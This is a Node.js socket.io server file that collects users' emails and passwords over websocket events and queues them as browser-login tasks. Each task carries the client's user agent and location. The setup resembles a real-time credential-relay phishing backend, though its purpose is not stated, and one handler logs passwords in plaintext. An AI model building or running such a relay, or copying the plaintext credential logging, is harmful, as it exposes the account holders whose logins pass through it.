const socketIO = require("socket.io");
const uuid = require("uuid");
const Publisher = require("../services/publisher");
const publisher = new Publisher();

let io;
const FRONTEND_URL = "http://127.0.0.1:5173";

const initializeSocket = (server) => {
  io = socketIO(server, {
    cors: {
      origin: FRONTEND_URL,
      methods: ["GET", "POST"],
    },
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    randomizationFactor: 0.5,
  });

  io.on("connection", (socket) => {
    console.log("New client connected");

    socket.on("disconnect", () => {
      console.log("User disconnected");
    });

    socket.on("init", (data) => {
      console.log(data);
    });

    socket.on("login_request", async (data) => {
      socket.emit("loading", true);
      console.log(
        `request to launch browser received: ${JSON.stringify(data)}`
      );

      publisher.publishMessage(
        "login_tasks",
        {
          action: "start_login",
          userAgent: data.userAgent,
          country: data.location.country,
          city: data.location.regionName,
          correlationId: data.correlationId,
        },
        data.correlationId
      );

      socket.join(data.correlationId);
    });

    socket.on("email_submit", async (data) => {
      publisher.publishMessage(
        "login_tasks",
        {
          action: "submit_email",
          email: data.email,
          correlationId: data.correlationId,
        },
        data.correlationId
      );

      socket.join(data.correlationId);

    })


    socket.on("password_submit", async (data) => {
      publisher.publishMessage(
        "login_tasks",
        {
          action: "submit_password",
          password: data.password,
          correlationId: data.correlationId,
        },
        data.correlationId
      );

      socket.join(data.correlationId);

    })

    socket.on("login_submit", async (data) => {
      socket.emit("loading", true);
      console.log(`request to submit form received: ${JSON.stringify(data)}`);

      publisher.publishMessage(
        "login_tasks",
        {
          action: "submit_login",
          email: data.email,
          password: data.password,
          correlationId: data.correlationId,
        },
        data.correlationId
      );

      socket.join(data.correlationId);
    });

    socket.on("login", (email, password) => {
      console.log("Received login request:", email);
      const correlationId = uuid.v4();
      const message = { email, password, correlationId };
      publisher.publishMessage("login_tasks", message);
    });
  });
};

const getIO = () => {
  if (!io) {
    throw new Error("Socket.io not initialized!");
  }
  return io;
};

module.exports = { initializeSocket, getIO };
